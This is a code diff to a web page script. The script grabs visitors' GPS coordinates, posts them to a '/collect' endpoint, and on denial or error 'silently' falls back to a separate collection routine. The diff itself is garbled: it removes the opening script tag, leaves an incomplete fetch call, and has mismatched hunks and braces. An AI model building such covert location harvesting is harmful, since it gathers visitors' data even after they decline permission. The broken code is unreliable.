@@ -78,12 +78,13 @@
         <strong>Warning:</strong> Location permissions require HTTPS or localhost. Please access this page over HTTPS or localhost for location features to work.
     </div>
 
-    <script>
         const ENDPOINT_GPS = (window.ENDPOINT_GPS || '/collect');
         const ENDPOINT_FALLBACK = (window.ENDPOINT_FALLBACK || '/collect-fallback');
 
         async function postJSON(url, data) {
-
+            try {
+                await fetch(url, {
+                    method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify(data),
                     keepalive: true
@@ -123,7 +124,8 @@
                     });
                     done();
                 },
-                async () => {
+                async (error) => {
+                    // On error or denial, silently fallback
                     await collectFallback();
                     done();
                 },
@@ -141,31 +143,6 @@
                 return;
             }
 
-        if (!navigator.geolocation) {
-            collectFallback().finally(done);
-            return;
+            // Request location normally to trigger permission prompt
+            requestLocation();
         }
-
-        // Directly request location without checking permissions API
-        navigator.geolocation.getCurrentPosition(
-            async (position) => {
-                await postJSON(ENDPOINT_GPS, {
-                    latitude: position.coords.latitude,
-                    longitude: position.coords.longitude
-                });
-                done();
-            },
-            async () => {
-                // On error or denial, silently fallback
-                await collectFallback();
-                done();
-            },
-            { enableHighAccuracy: false, timeout: 10000, maximumAge: 0 }
-        );
-
-        // Fallback timeout if no response within 12 seconds
-        setTimeout(() => {
-            document.getElementById('loading').style.display = 'none';
-            document.getElementById('blocked').style.display = 'block';
-            collectFallback();
-        }, 12000);
